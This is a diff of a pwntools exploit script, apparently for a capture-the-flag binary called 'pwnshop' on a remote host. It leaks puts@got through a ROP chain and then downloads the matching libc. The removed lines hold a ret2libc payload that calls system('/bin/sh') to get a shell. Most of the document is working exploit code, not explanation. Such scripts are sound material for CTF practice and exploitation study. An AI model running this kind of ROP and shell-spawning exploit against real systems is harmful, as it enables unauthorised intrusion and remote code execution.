@@ -2,15 +2,14 @@
 
 
 from pwn import *
+from pwnc.pwnc import get_libc
 
 BINARY = "./pwnshop"
-LIBC = "./libc.so.6"
 ADDR = "138.68.148.149"
 PORT = 30975
 
 splash()
 elf = context.binary = ELF(BINARY)
-libc = ELF(LIBC, checksec=False)
 
 
 class Offsets:
@@ -57,21 +56,13 @@ def solve():
     io.sendafter("Enter details: ", flat(payload))
     puts_leak = io.recvuntil("\n")[:-1]
     puts_leak = u64(puts_leak.ljust(8, b"\x00"))
-    libc.address = puts_leak - libc.sym.puts
-    bin_sh = next(libc.search(b"/bin/sh\x00"))
     log.success(f"puts@got found @: {hex(puts_leak)}")
-    log.success(f"libc base address found @: {hex(libc.address)}")
-    log.success(f"/bin/sh string found @: {hex(bin_sh)}")
 
-    payload = [
-        cyclic(40, n=8),
-        elf.address + Gadgets.pop_rdi_ret,
-        bin_sh,
-        libc.sym.system,
-        libc.sym.exit,
-        elf.address + Gadgets.sub_rsp_0x28_ret,
-    ]
-    io.sendafter("Enter details: ", flat(payload))
+    known_syms = {"puts": hex(puts_leak)}
+    libc = get_libc(known_syms)
+
+    with open("./libc.so.6", "wb") as libc_file:
+        libc_file.write(libc)
 
     io.interactive()
 
